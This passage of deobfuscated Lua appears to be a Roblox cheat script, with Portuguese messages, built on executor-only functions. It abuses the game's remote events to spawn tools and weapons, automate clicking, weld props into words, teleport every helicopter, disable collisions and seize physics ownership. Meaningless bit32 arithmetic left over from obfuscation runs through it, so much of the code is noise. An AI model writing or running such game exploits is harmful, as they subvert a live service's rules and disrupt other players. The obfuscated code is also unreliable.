								propMaker2:WaitForChild("Tool_PropMake"):FireServer(model, Vector3.new(-153.48038, 0.024999619, -43.405685))
								local n44 = 94674996
								local n45 = n42 + 177774277
								task.wait(0.1)
								local humanoid2 = localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid")

								if humanoid2 then
									humanoid2:UnequipTools()
								end

								local v93 = pcall
								local v94 = table.pack(bit32.band(bit32.band(518760277, n44), 4294967295))
								local v95 = table.pack(bit32.band(v94[1], 65535))
								local n46 = n44 + 4047639681 + bit32.band(65534 * v95[1] + bit32.lshift(bit32.band(65534 * bit32.rshift(v94[1], 16) + 65535 * v95[1], 65535), 16), 4294967295) + 5061055188

								local function fn7()
									ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "PropMaker")
								end

								v93(fn7)
								n42 = n45 - 177774277
								n41 = n41 - v92 - 1876877144
							end

							local v93 = task
							local v94 = bit32.lshift(n41, 12)
							v93.wait(0.2)
						end

						local n001TrafficCones2 = workspace:FindFirstChild("WorkspaceCom") and workspace.WorkspaceCom:FindFirstChild("001_TrafficCones")
						n001TrafficCones2 = n001TrafficCones2 and n001TrafficCones2:FindFirstChild("Prop" .. localPlayer.Name)
						if n001TrafficCones2 and n001TrafficCones2:FindFirstChild("Tools") and n001TrafficCones2.Tools:FindFirstChild(arg7) then
							return n001TrafficCones2.Tools[arg7]:FindFirstChild("ClickDetector") or n001TrafficCones2.Tools[arg7]:FindFirstChildWhichIsA("ClickDetector")
						end
						return nil
					end)

					return ok2 and result2 or nil
				end,
			}
		end

		local tbl9 = {
			Paper = {
				getPosition = function()
					local n39 = 589742113

					local ok2, result2 = pcall(function()
						local tools = workspace:FindFirstChild("WorkspaceCom") and workspace.WorkspaceCom:FindFirstChild("001_DayCare") and workspace.WorkspaceCom["001_DayCare"]:FindFirstChild("Tools")

						if tools then
							local paper = tools:FindFirstChild("Paper") or tools:GetChildren()[20]
							if paper then
								return paper.CFrame + Vector3.new(0, 3, 0)
							end
						end

						return nil
					end)

					return ok2 and result2 or CFrame.new(-132.09, 17.19, 121.98)
				end,
				getClickDetector = function()
					local n39 = 8657826864

					local ok2, result2 = pcall(function()
						local tools = workspace:FindFirstChild("WorkspaceCom") and workspace.WorkspaceCom:FindFirstChild("001_DayCare") and workspace.WorkspaceCom["001_DayCare"]:FindFirstChild("Tools")

						if tools then
							local paper = tools:FindFirstChild("Paper") or tools:GetChildren()[20]
							if paper then
								return paper:FindFirstChild("ClickDetector") or paper:FindFirstChildWhichIsA("ClickDetector")
							end
						end

						return nil
					end)

					return ok2 and result2 or nil
				end,
			},
		}

		local v91 = bit32.rshift(n35, 25)
		local flashLight = fn6(228958393, { "RequestingPropName", "ToolsFlashLight", "Tools" }, "FlashLight", arg3)
		local v92 = table.pack(bit32.band(arg4, 4294967295))
		local v93 = table.pack(bit32.band(v92[1], 65535))
		local n39 = 2147483647 + bit32.band(0 * v93[1] + bit32.lshift(bit32.band(0 * bit32.rshift(v92[1], 16) + 32768 * v93[1], 65535), 16), 4294967295)
		local v94 = bit32.bxor(arg4, 381869696)
		local v95 = bit32.bnot(v94)
		local n40 = bit32.bor(n38, 4153126214)
		local v96 = table.pack(bit32.band(v95, 4294967295))
		local v97 = table.pack(bit32.band(v96[1], 65535))
		local n41 = n39 + 0 + bit32.band(65535 * v97[1] + bit32.lshift(bit32.band(65535 * bit32.rshift(v96[1], 16) + 32767 * v97[1], 65535), 16), 4294967295)
		tbl9.FlashLight = flashLight
		tbl9.BabyBoy = fn6(228958393, { "RequestingPropName", "BabyBoyWhite", "Baby", "Play" }, "BabyBoy", arg3)
		local n42 = v91 // 14
		tbl9.BabyGirl = fn6(228958393, { "RequestingPropName", "BabyGirlWhite", "Baby", "Play" }, "BabyGirl", arg3)

		local box = {
			getPosition = function()
				return CFrame.new(1182.52466, 76.2248383, -1213.21289, 0.962467492, -5.45791679e-09, 0.271397024, 5.02419617e-09, 1, 2.29291874e-09, -0.271397024, -8.43307812e-10, 0.962467492)
			end,
			getClickDetector = function()
				local n43 = 8670968388

				local ok2, result2 = pcall(function()
					local v98 = bit32.bxor(n43, 1279000540)
					local n44 = 4232303207
					local vehicles = workspace:FindFirstChild("Vehicles")
					vehicles = vehicles and vehicles:FindFirstChild(localPlayer.Name .. "Car")
					local body = vehicles and vehicles:FindFirstChild("Body")

					if body then
						local body2 = vehicles.Body
						local v99 = bit32.band(v98, n44)
						body = body2:FindFirstChild("Tools")
					end

					if body then
						local box = vehicles.Body.Tools:GetChildren()[6] or vehicles.Body.Tools:FindFirstChild("Box")
						if box then
							return box:FindFirstChild("ClickDetector") or box:FindFirstChildWhichIsA("ClickDetector")
						end
					end

					ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer("PickingCar", "MailTruck")
					task.wait(0.5)
					local vehicles2 = workspace:FindFirstChild("Vehicles")
					vehicles2 = vehicles2 and vehicles2:FindFirstChild(localPlayer.Name .. "Car")

					if vehicles2 and vehicles2:FindFirstChild("Body") and vehicles2.Body:FindFirstChild("Tools") then
						local box = vehicles2.Body.Tools:GetChildren()[6] or vehicles2.Body.Tools:FindFirstChild("Box")
						if box then
							return box:FindFirstChild("ClickDetector") or box:FindFirstChildWhichIsA("ClickDetector")
						end
					end

					return nil
				end)

				return ok2 and result2 or nil
			end,
		}

		local function onCleanup()
			local n43 = 13049700372

			pcall(function()
				ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer("DeleteAllVehicles")
			end)
		end

		if bit32.bxor(n41, 155262796) == 159224732 then
			v90 = bit32.bxor(v90, 1226547715)
		end

		box.onCleanup = onCleanup
		tbl9.Box = box
		local paper = tbl9[arg2]

		if not paper then
			warn("Tipo de tool inválido, usando Paper como padrão")
			paper = tbl9.Paper
		end

		local humanoid = character:FindFirstChildOfClass("Humanoid")

		if humanoid then
			humanoid.Sit = false
		end

		if fn2(arg3, 482187767) < v82 then
			local v98 = paper.getPosition()

			if v98 then
				humanoidRootPart.CFrame = v98
			end

			task.wait(0.5)

			while not flag do
				local v99 = paper.getClickDetector()

				if v99 then
					if arg2 ~= "Paper" then
						for i2 = 1, 5 do
							fireclickdetector(v99)
						end
					else
						fireclickdetector(v99)
					end

					local v100 = fn2(arg3, 482187767)
					local floor = math.floor
					local n43 = v100 / v82
					local v101 = bit32.bxor(n41, 475771594)
					local v102 = floor(n43 * 100)
					local v103 = textLabel2
					local text = string.format("Coletando: %d/%d (%d%%)", v100, v82, v102)
					local v104 = bit32.bxor(v101, 3562896)
					v103.Text = text
					task.wait(arg2 ~= "Paper" and 0.01 or 0.1)
					n41 = bit32.bxor(v104, 476966746)
					if not (v82 <= fn2(arg3, 482187767)) then
						continue
					end
				else
					warn("ClickDetector não encontrado!")
					textLabel2.Text = "Erro: ClickDetector ausente!"
					task.wait(1)
					break
				end

				break
			end
		else
			textLabel2.Text = string.format("Já tenho: %d/%d (100%%)", fn2(arg3, 482187767), v82)
			n40 = n40 // 5 - 966577876
		end

		if flag or fn2(arg3, 482187767) < v82 then
			if not flag then
				textLabel2.Text = string.format("Erro: Coleta incompleta (%d/%d)", fn2(arg3, 482187767), v82)
				local wait = task.wait
				local n43 = n42 * bit32.bxor(n41, 0)
				wait(2)
			end

			if paper.onCleanup then
				pcall(paper.onCleanup)
			end

			fn5(arg3, position, 455395247)
			sound:Stop()
			sound:Destroy()
			screenGui:Destroy()
			getgenv()._Running = false
			return
		end

		textLabel2.Text = " Coleta Concluída! " .. v82 .. "/" .. v82
		task.wait(1)
		local n43 = n40 - 2287481212

		for _, child in ipairs(localPlayer.Character:GetChildren()) do
			if child:IsA("Tool") and child.Name == arg2 then
				child.Parent = localPlayer.Backpack
			end
		end

		task.wait(0.2)
		local tbl10 = {}
		local v98, v99, v100 = ipairs(localPlayer.Backpack:GetChildren())
		local v101 = bit32.bxor(n41, 128291151)

		for _, v102 in v98, v99, v100 do
			if v102:IsA("Tool") and v102.Name == arg2 then
				table.insert(tbl10, v102)
			end
		end

		local tbl11 = {}
		local vector_ = Vector3.new(0, -5, 0)
		local handle = tbl10[1]

		if handle then
			local v102 = tbl10[1]
			local v103 = bit32.band(n42, 160648453)
			handle = v102:FindFirstChild("Handle")

			if not handle then
				handle = tbl10[1]:FindFirstChildWhichIsA("BasePart")
				v101 = bit32.bxor(bit32.bxor(v101, 23053157), 23053157)
			end

			n42 = v103 + 2
		end

		local vector_2 = Vector3.new(1.2, 1.2, 0)

		if handle then
			local vector_3 = Vector3.new
			local n44 = math.max(1.2, handle.Size.X + 0.12)
			local max = math.max
			local v102 = bit32.bor(n43, 366850625)
			vector_2 = vector_3(n44, max(1.2, handle.Size.Y + 0.12), 0)
			n43 = v102 + 4020490240
		end

		local n44 = 1
		local n45 = 0

		for i2 = 1, #v81 do
			local v102 = tbl[v81:sub(i2, i2):upper()]

			if v102 then
				for i3 = 1, #v102 do
					for i4 = 1, #v102[i3] do
						if v102[i3]:sub(i4, i4) == "1" then
							local v103 = tbl10[n44]

							if v103 then
								tbl11[v103] = CFrame.new(vector_.X + (n45 + i4 - 1) * vector_2.X, vector_.Y + (i3 - 1) * vector_2.Y, vector_.Z)
								n44 += 1
							end
						end
					end
				end

				n45 = n45 + #v102[1] + 1
			end
		end

		if humanoid then
			humanoid.Sit = false
		end

		if paper.onCleanup then
			pcall(paper.onCleanup)
		end

		fn5(arg3, position, 455395247)
		task.wait(3)
		local rightHand = character:FindFirstChild("RightHand") or character:FindFirstChild("Right Arm")

		if not rightHand then
			sound:Stop()
			sound:Destroy()
			screenGui:Destroy()
			getgenv()._Running = false
			return
		end

		local v102 = ipairs
		local v103 = table.pack(rightHand:GetChildren())

		for _, v104 in v102(table.unpack(v103, 1, v103.n)) do
			if v104.Name:match("^CoquetteWordGrip_") then
				v104:Destroy()
			end
		end

		for i2 = 1, math.min(v82, #tbl10) do
			local v104 = tbl10[i2]
			local v105 = tbl11[v104]

			if v105 then
				v104.Grip = v105
				v104.Parent = localPlayer.Character
				task.wait(0.03)
			end
		end

		local v104 = task
		local v105 = table.pack(bit32.band(v101, 4294967295))
		local v106 = table.pack(bit32.band(v105[1], 65535))
		local n46 = 3560950302 + bit32.band(51743 * v106[1] + bit32.lshift(bit32.band(51743 * bit32.rshift(v105[1], 16) + 54335 * v106[1], 65535), 16), 4294967295)
		local v107 = bit32.bxor(v101, 513754158)
		local v108 = table.pack(bit32.band(bit32.bnot(v107), 4294967295))
		local v109 = table.pack(bit32.band(v108[1], 65535))
		local v110 = bit32.band(65535 * v109[1] + bit32.lshift(bit32.band(65535 * bit32.rshift(v108[1], 16) + 32767 * v109[1], 65535), 16), 4294967295)
		local v111 = bit32.bnot(v101)
		local v112 = bit32.rshift(n42, 6)
		local v113 = table.pack(bit32.band(v111, 4294967295))
		local v114 = table.pack(bit32.band(v113[1], 65535))
		local n47 = n46 + 0 + v110 + bit32.band(51743 * v114[1] + bit32.lshift(bit32.band(51743 * bit32.rshift(v113[1], 16) + 21567 * v114[1], 65535), 16), 4294967295)
		v104.wait(0.2)
		local rightGrip = rightHand:FindFirstChild("RightGrip")
		local rightGripAttachment = rightHand:FindFirstChild("RightGripAttachment")
		local c0 = rightGrip and rightGrip.C0 or rightGripAttachment and rightGripAttachment.CFrame or CFrame.new()

		if rightGrip then
			rightGrip:Destroy()
		end

		for i2 = 1, math.min(v82, #tbl10) do
			local v115 = tbl10[i2]
			local v116 = tbl11[v115]
			local handle2 = v115 and (v115:FindFirstChild("Handle") or v115:FindFirstChildWhichIsA("BasePart"))

			if v115 and v116 and handle2 then
				local v117 = bit32.bxor(n47, 354302102)
				handle2.Anchored = false
				handle2.CanCollide = false
				handle2.Massless = true
				local weld = Instance.new("Weld")
				weld.Name = "CoquetteWordGrip_" .. i2
				weld.Part0 = rightHand
				weld.Part1 = handle2
				weld.C0 = c0
				weld.C1 = v116
				weld.Parent = rightHand
				n47 = bit32.bxor(v117, 354302102)
			end
		end

		sound:Stop()
		sound:Destroy()
		screenGui:Destroy()
		getgenv()._Running = false
	end

	fn3(75013141, fn4, 507359302)
end

-- payload closure created 476-th (proto #322)
local function payload_fn_476(arg)
	upv1 = arg
end

-- payload closure created 477-th (proto #323)
local function payload_fn_477(arg)
	upv1 = arg
end

-- payload closure created 478-th (proto #324)
local function payload_fn_478()
	if upv1 == "" then
		game.StarterGui:SetCore("SendNotification", {
			Title = "ERRO",
			Text = " Digite um texto primeiro!",
			Duration = 3,
			Icon = "rbxassetid://2541869220",
		})

		return
	end

	BuildCustomWord(upv1, upv2)
end

-- payload closure created 480-th (proto #329)
local function payload_fn_480(arg)
	if arg == "Water Balloon" then
		local n2 = 576616252

		pcall(function()
			local n1Too1l = upv1:FindFirstChild("RE") and upv1.RE:FindFirstChild("1Too1l")

			if n1Too1l then
				n1Too1l:InvokeServer("PickingTools", "Water Balloon")
			end
		end)

		return
	end

	local n1Playe1rTrigge1rEven1t = upv1:FindFirstChild("RE") and upv1.RE:FindFirstChild("1Playe1rTrigge1rEven1t")

	if n1Playe1rTrigge1rEven1t then
		local n2 = 394161919

		pcall(function()
			n1Playe1rTrigge1rEven1t:FireServer("AcceptedToolToServer", arg, upv2.LocalPlayer)
		end)
	end
end

-- payload closure created 481-th (proto #327)
local function payload_fn_481(arg)
	upv1 = arg
end

-- payload closure created 482-th (proto #328)
local function payload_fn_482()
	upv3(upv1[upv2] or upv2)
end

-- payload closure created 484-th (proto #331)
local function payload_fn_484(arg)
	upv1 = arg
end

-- payload closure created 485-th (proto #332)
local function payload_fn_485()
	upv1(upv2[upv3] or upv3)
end

-- payload closure created 486-th (proto #333)
local function payload_fn_486(arg)
	upv1 = arg
end

-- payload closure created 487-th (proto #334)
local function payload_fn_487()
	upv3(upv1[upv2] or upv2)
end

-- payload closure created 488-th (proto #335)
local function payload_fn_488(arg)
	upv1 = arg
end

-- payload closure created 489-th (proto #336)
local function payload_fn_489()
	upv3(upv1[upv2] or upv2)
end

-- payload closure created 490-th (proto #337)
local function payload_fn_490(arg)
	upv1 = arg
end

-- payload closure created 491-th (proto #338)
local function payload_fn_491()
	upv3(upv1[upv2] or upv2)
end

-- payload closure created 492-th (proto #339)
local function payload_fn_492(arg)
	upv1 = arg
end

-- payload closure created 493-th (proto #340)
local function payload_fn_493()
	upv3(upv1[upv2] or upv2)
end

-- payload closure created 494-th (proto #341)
local function payload_fn_494(arg)
	upv1 = arg
end

-- payload closure created 495-th (proto #342)
local function payload_fn_495()
	upv3(upv1[upv2] or upv2)
end

-- payload closure created 496-th (proto #343)
local function payload_fn_496(arg)
	upv1 = arg
end

-- payload closure created 497-th (proto #344)
local function payload_fn_497()
	upv3(upv1[upv2] or upv2)
end

-- payload closure created 498-th (proto #345)
local function payload_fn_498()
	upv1("TearGasLauncher")
end

-- payload closure created 499-th (proto #346)
local function payload_fn_499()
	upv1("WardenPistol")
end

-- payload closure created 500-th (proto #347)
local function payload_fn_500()
	upv1("RPG")
end

-- payload closure created 501-th (proto #350)
local function payload_fn_501()
	local n2 = 596415342

	pcall(function()
		settings().Physics.AllowSleep = false
		sethiddenproperty(upv1, "SimulationRadius", math.huge)
	end)
end

-- payload closure created 502-th (proto #349)
local function payload_fn_502()
	local n2 = 1124841673
	local n3 = 3393738381
	if upv1 or not upv2 then
		return
	end
	upv1 = true
	local character = upv3.Character
	if not character then
		upv1 = false
		return
	end
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then
		upv1 = false
		return
	end
	local cFrame = humanoidRootPart.CFrame
	upv4()
	humanoidRootPart.CFrame = upv5
	task.wait(0.6)
	local children = workspace.Helicopters:GetChildren()

	for _, child in ipairs(children) do
		local n4 = 485542441

		for _, descendant in ipairs(child:GetDescendants()) do
			if descendant.Name == "CoquetteMover" or descendant.Name == "CoquetteAlign" then
				descendant:Destroy()
			end
		end

		local x = upv6.X
		local random = math.random
		local v = upv7
		local v2 = bit32.bxor(n4, 416003718)
		local n5 = x + random(-v, 50)
		local z = upv6.Z
		local random2 = math.random
		local n6 = -upv7
		local n7 = bit32.bxor(v2, 90262128) + 4023042762
		local v3 = table.pack(bit32.band(n6, 4294967295))
		local v4 = table.pack(bit32.band(v3[1], 65535))
		local v5 = bit32.band(49866 * v4[1] + bit32.lshift(bit32.band(49866 * bit32.rshift(v3[1], 16) + 61386 * v4[1], 65535), 16), 4294967295)
		local v6 = table.pack(bit32.band(bit32.bnot(n6), 4294967295))
		local v7 = table.pack(bit32.band(v6[1], 65535))
		local n8 = n7 + v5 + bit32.band(49866 * v7[1] + bit32.lshift(bit32.band(49866 * bit32.rshift(v6[1], 16) + 61386 * v7[1], 65535), 16), 4294967295)
		local cframe = CFrame.new(n5, upv6.Y + 5, z + random2(n6, 50))

		pcall(function()
			if child.PrimaryPart then
				child:PivotTo(cframe)
			else
				local basePart = child:FindFirstChildWhichIsA("BasePart", true)

				if basePart then
					basePart.CFrame = cframe
				end
			end
		end)
	end

	task.wait(0.6)
	humanoidRootPart.CFrame = cFrame
	task.wait(2)
	upv1 = false
end

-- payload closure created 503-th (proto #348)
local function payload_fn_503(arg)
	upv1 = arg

	if upv1 then
		task.spawn(upv2)
		local n2 = 610876602

		upv3 = workspace.Helicopters.ChildAdded:Connect(function()
			task.wait(1)
			upv2()
		end)

		task.spawn(function()
			while upv1 do
				upv4()
				task.wait(1)
			end
		end)
	elseif upv3 then
		upv3:Disconnect()
		upv3 = nil
	end
end

-- payload closure created 507-th (proto #t4748)
local function payload_fn_507(arg)
	local character = upv1.Character
	if not character then
		return
	end

	for _, descendant in ipairs(character:GetDescendants()) do
		if descendant:IsA("BasePart") then
			if arg then
				descendant.CanCollide = false
			end
		end
	end
end

-- payload closure created 508-th (proto #357)
local function payload_fn_508()
	if upv1.Conn then
		upv1.Conn:Disconnect()
		upv1.Conn = nil
	end

	local character = upv2.Character

	if character then
		for _, descendant in ipairs(character:GetDescendants()) do
			if descendant:IsA("BasePart") then
				if descendant.Name == "Head" or descendant.Name == "Torso" or descendant.Name == "UpperTorso" or descendant.Name == "LowerTorso" then
					descendant.CanCollide = true
				elseif descendant.Name == "HumanoidRootPart" or descendant:FindFirstAncestorOfClass("Accessory") then
					descendant.CanCollide = false
				end
			end
		end
	end
end

-- payload closure created 509-th (proto #356)
local function payload_fn_509()
	local n2 = 1036184082
	if upv1.Conn then
		return
	end

	upv1.Conn = upv2.Heartbeat:Connect(function()
		local character = upv3.Character
		if not character then
			return
		end
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

		if humanoidRootPart and humanoidRootPart.Position.Y < -500 then
			humanoidRootPart.CFrame = CFrame.new(0, 100, 0)
		end

		upv4(true)
	end)
end

-- payload closure created 510-th (proto #t2572)
local function payload_fn_510(arg)
	local tools = workspace:FindFirstChild("WorkspaceCom") and workspace.WorkspaceCom:FindFirstChild("001_DayCare") and workspace.WorkspaceCom["001_DayCare"]:FindFirstChild("Tools")
	local v = tools and tools:FindFirstChild(arg)
	if not v then
		return nil
	end
	return v:IsA("BasePart") and v or v:FindFirstChildWhichIsA("BasePart", true)
end

-- payload closure created 511-th (proto #353)
local function payload_fn_511(arg, arg2)
	local n2 = 462224487

	if arg + 413030876 == 163629394 then
	end

	local tbl = {}
	local v = table.pack(bit32.band(n2, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	local n3 = bit32.band(11320 * v2[1] + bit32.lshift(bit32.band(11320 * bit32.rshift(v[1], 16) + 9770 * v2[1], 65535), 16), 4294967295) + 127871715
	local v3 = table.pack(bit32.band(bit32.band(127871715, n2), 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local v5 = bit32.band(65534 * v4[1] + bit32.lshift(bit32.band(65534 * bit32.rshift(v3[1], 16) + 65535 * v4[1], 65535), 16), 4294967295)
	local v6 = table.pack(bit32.band(bit32.bnot(n2), 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local v8 = bit32.bxor(n3 + v5 + 640298039 + bit32.band(11319 * v7[1] + bit32.lshift(bit32.band(11319 * bit32.rshift(v6[1], 16) + 9770 * v7[1], 65535), 16), 4294967295), 105839620)

	tbl.GetTargetCFrame = function()
		local v9 = upv1(arg2)
		return v9 and v9.CFrame + Vector3.new(0, 3, 0) or CFrame.new(-132.09, 17.19, 121.98)
	end

	tbl.ClickPath = "WorkspaceCom.001_DayCare.Tools." .. arg2 .. ".ClickDetector"
	return tbl
end

-- payload closure created 512-th (proto #t1108)
local function payload_fn_512(arg, arg2)
	local n2 = 2210034472
	local n3 = 1884325763
	local n4 = 91330956
	local n5 = n4 + 331583202
	local cframe = CFrame.new
	local n6 = 1677075035 - bit32.bxor(n5, 0)
	arg2.CFrame = cframe(13.8370638, -29.8860035, -60.4958534, 0.14835529, -6.69252387e-08, -0.9889341, -6.82029366e-08, 1, -7.79056037e-08, 0.9889341, 7.90059147e-08, 0.14835529)
	task.wait(0.1)

	if not upv1.Backpack:FindFirstChild("PropMaker") and not arg:FindFirstChild("PropMaker") then
		game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "PropMaker")
		n3 = n3 - 1541995083 + 1541995083
	end

	game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllProps")
	task.wait(0.1)
	local propMaker = arg:FindFirstChild("PropMaker")
	local propMaker2

	if propMaker then
		propMaker2 = propMaker
	else
		propMaker2 = upv1.Backpack:FindFirstChild("PropMaker")
	end

	if propMaker2 then
		local humanoid = arg:FindFirstChild("Humanoid")

		if humanoid then
			humanoid:EquipTool(propMaker2)
		end
	end

	task.wait(0.5)
	local n7 = n6 + 807468477
	game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TelemetryClientInteraction"):FireServer("filterClick", { name = "PresentSingleBalloon", itemType = "Props", filter = "Seasonal" })
	local n8 = n5 - 153457021 + 124451204
	game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("RequestingPropName", "PresentSingleBalloon", "Present", "Seasonal")
	task.wait(0.5)

	if propMaker2 then
		local model = workspace:WaitForChild("Model"):FindFirstChildOfClass("Model") or workspace:WaitForChild("Model"):FindFirstChildOfClass("Part")

		if not model then
			model = workspace:WaitForChild("Model"):GetChildren()[1]
		end

		if model then
			propMaker2:WaitForChild("Tool_PropMake"):FireServer(model, Vector3.new(23.08966, 0.025000572, -49.573837))
		end
	end

	task.wait(0.15)
	local v = workspace:WaitForChild("WorkspaceCom"):WaitForChild("001_TrafficCones"):FindFirstChild("Prop" .. upv1.Name)

	if v then
		v:WaitForChild("SetCurrentCFrame"):InvokeServer(CFrame.new(18.069549560546875, -32.075000762939453, -59.633426666259766, -0.87052851915359497, 0, -0.49212715029716492, 0, 1, 0, 0.49212715029716492, 0, -0.87052851915359497))
	end

	task.wait(0.1)
	local humanoid = arg:FindFirstChild("Humanoid")

	if humanoid then
		humanoid:UnequipTools()
	end

	task.wait(0.1)
	game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
end

-- payload closure created 513-th (proto #t8289)
local function payload_fn_513()
	return "WorkspaceCom.001_TrafficCones.Prop" .. upv1.Name .. ".Tools.Balloon.ClickDetector"
end

-- payload closure created 514-th (proto #t5117)
local function payload_fn_514(arg, arg2)
	local n2 = 246536067
	local n3 = 1360912237
	local n4 = 738677205
	arg2.CFrame = CFrame.new(-153.48037719726562, 3, -43.405685424804688)
	task.wait(0.1)

	if not upv1.Backpack:FindFirstChild("PropMaker") and not arg:FindFirstChild("PropMaker") then
		game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "PropMaker")
	end

	game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllProps")
	task.wait(0.1)
	local propMaker = arg:FindFirstChild("PropMaker") or upv1.Backpack:FindFirstChild("PropMaker")

	if propMaker then
		local humanoid = arg:FindFirstChild("Humanoid")

		if humanoid then
			humanoid:EquipTool(propMaker)
		end
	end

	local n5 = n4 // 9
	task.wait(0.5)
	game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("RequestingPropName", "ToolsFlashLight", "Tools")
	local v = table.pack(bit32.band(n2, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	local n6 = bit32.band(19146 * v2[1] + bit32.lshift(bit32.band(19146 * bit32.rshift(v[1], 16) + 11131 * v2[1], 65535), 16), 4294967295) + 3562574348
	local v3 = table.pack(bit32.band(bit32.bor(n2, 198782862), 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local v5 = bit32.band(46391 * v4[1] + bit32.lshift(bit32.band(46391 * bit32.rshift(v3[1], 16) + 54404 * v4[1], 65535), 16), 4294967295)
	local v6 = table.pack(bit32.band(bit32.band(n2, 198782862), 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local n7 = n6 + v5 + bit32.band(46389 * v7[1] + bit32.lshift(bit32.band(46389 * bit32.rshift(v6[1], 16) + 54404 * v7[1], 65535), 16), 4294967295)
	task.wait(0.5)

	if propMaker then
		local street = workspace:FindFirstChild("Model") and workspace.Model:FindFirstChild("Street") and workspace.Model.Street:FindFirstChild("Street") or workspace:WaitForChild("Model"):FindFirstChildOfClass("Model") or workspace:WaitForChild("Model"):FindFirstChildOfClass("Part")
		local v8

		if street then
			v8 = street
		else
			v8 = workspace:WaitForChild("Model"):GetChildren()[1]
		end

		if v8 then
			propMaker:WaitForChild("Tool_PropMake"):FireServer(v8, Vector3.new(-153.48038, 0.024999619, -43.405685))
		end
	end

	task.wait(0.15)
	local n8 = n5 // 7
	local v8 = workspace:WaitForChild("WorkspaceCom"):WaitForChild("001_TrafficCones"):FindFirstChild("Prop" .. upv1.Name)

	if v8 and v8:FindFirstChild("SetCurrentCFrame") then
		v8.SetCurrentCFrame:InvokeServer(CFrame.new(-153.48037719726562, 0.024999618530273438, -43.405685424804688))
	end

	task.wait(0.1)
	local humanoid = arg:FindFirstChild("Humanoid")

	if humanoid then
		humanoid:UnequipTools()
	end

	task.wait(0.1)
	local v9 = game
	v9:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")

	local function fn()
		game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "PropMaker")
	end

	pcall(fn)
end

-- payload closure created 515-th (proto #t5437)
local function payload_fn_515()
	return "WorkspaceCom.001_TrafficCones.Prop" .. upv1.Name .. ".Tools.FlashLight.ClickDetector"
end

-- payload closure created 517-th (proto #t9486)
local function payload_fn_517(arg)
	local v = workspace

	for match in string.gmatch(arg, "[^%.]+") do
		v = v:FindFirstChild(match)
		if not v then
			return nil
		end
	end

	return v
end

-- payload closure created 518-th (proto #t5766)
local function payload_fn_518(arg)
	local n2 = 218695333
	if not arg then
		return
	end
	local n3 = n2 + 385188377

	pcall(function()
		fireclickdetector(arg)
	end)
end

-- payload closure created 519-th (proto #t937)
local function payload_fn_519(arg, worldCFrame)
	local n2 = 3906317325
	local n3 = 1071651858
	local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then
		return
	end
	upv1 = Instance.new("AlignPosition")
	upv2 = Instance.new("AlignOrientation")
	upv1.MaxForce = math.huge
	upv1.Responsiveness = 200
	upv2.MaxTorque = math.huge
	local v = table.pack(bit32.band(n2, 4294967295))
	local v2 = table.pack(bit32.band(v[1], 65535))
	local v3 = bit32.band(v2[1] * 32267 + bit32.lshift(bit32.band(v2[1] * 0 + bit32.rshift(v[1], 16) * 32267, 65535), 16), 4294967295)
	upv2.Responsiveness = 200
	local attachment = Instance.new("Attachment", humanoidRootPart)
	attachment.Name = "SpamAttachment"
	upv3 = Instance.new("Attachment", workspace.Terrain)
	upv3.WorldCFrame = worldCFrame
	upv1.Attachment0 = attachment
	upv1.Attachment1 = upv3
	upv2.Attachment0 = attachment
	upv2.Attachment1 = upv3
	upv1.Parent = humanoidRootPart
	upv2.Parent = humanoidRootPart
end

-- payload closure created 520-th (proto #358)
local function payload_fn_520(arg)
	if upv1 then
		upv1:Destroy()
		upv1 = nil
	end

	if upv2 then
		upv2:Destroy()
		upv2 = nil
	end

	if upv3 then
		upv3:Destroy()
		upv3 = nil
	end

	arg = arg and arg:FindFirstChild("HumanoidRootPart")

	if arg then
		for _, child in ipairs(arg:GetChildren()) do
			if child:IsA("Attachment") and child.Name == "SpamAttachment" then
				child:Destroy()
			end
		end
	end
end

-- payload closure created 521-th (proto #354)
local function payload_fn_521(arg)
	metodo = arg
end

-- payload closure created 522-th (proto #355)
local function payload_fn_522(arg)
	local n2 = 244212917
	local n3 = 3323620753
	ativo = arg
	local character = upv1.Character
	if not character then
		return
	end
	local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
	if not humanoidRootPart then
		return
	end
	pcall(upv2)
	local n4 = 541939054
	local v = upv3[metodo]
	if not v then
		return
	end
	local n5 = n3 + n2
	posOriginal = humanoidRootPart.CFrame
	local n6 = n4 - 186795805

	if v.CustomSetup then
		v.CustomSetup(character, humanoidRootPart)
	elseif v.SetupClickPath and v.SetupCFrame then
		humanoidRootPart.CFrame = v.SetupCFrame
		task.wait(0.3)
		upv4(upv5(v.SetupClickPath))
		task.wait(0.3)
	end

	local fixedCFrame = v.FixedCFrame or v.CFrame
	local v2

	if v.GetTargetCFrame then
		v2 = v.GetTargetCFrame() or fixedCFrame
	else
		v2 = fixedCFrame
	end

	upv6(character, v2)

	loop = task.spawn(function()
